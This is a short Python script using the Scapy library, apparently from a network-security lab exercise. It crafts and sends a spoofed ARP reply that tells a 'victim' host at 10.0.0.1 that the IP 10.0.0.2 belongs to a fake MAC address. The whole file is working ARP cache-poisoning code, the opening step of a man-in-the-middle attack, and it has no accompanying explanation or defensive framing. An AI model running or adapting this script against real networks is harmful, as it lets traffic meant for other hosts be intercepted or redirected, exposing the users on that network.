#!/usr/bin/python3
# Mohamed Trigui 9/30/2024

from scapy.all import *

VICTIM_IP = "10.0.0.1"

FAKE_IP = "10.0.0.2"
FAKE_MAC = "08:00:27:84:5e:b9"

print("SENDING SPOOFED ARP REPLY")

ether = Ether()
ether.dst = "82:20:d7:31:3a:4a"
ether.src = FAKE_MAC

arp = ARP()
arp.psrc = FAKE_IP
arp.hwsrc = FAKE_MAC
arp.pdst = VICTIM_IP
arp.hwdst = ether.dst
arp.op = 2

frame = ether/arp
sendp(frame)
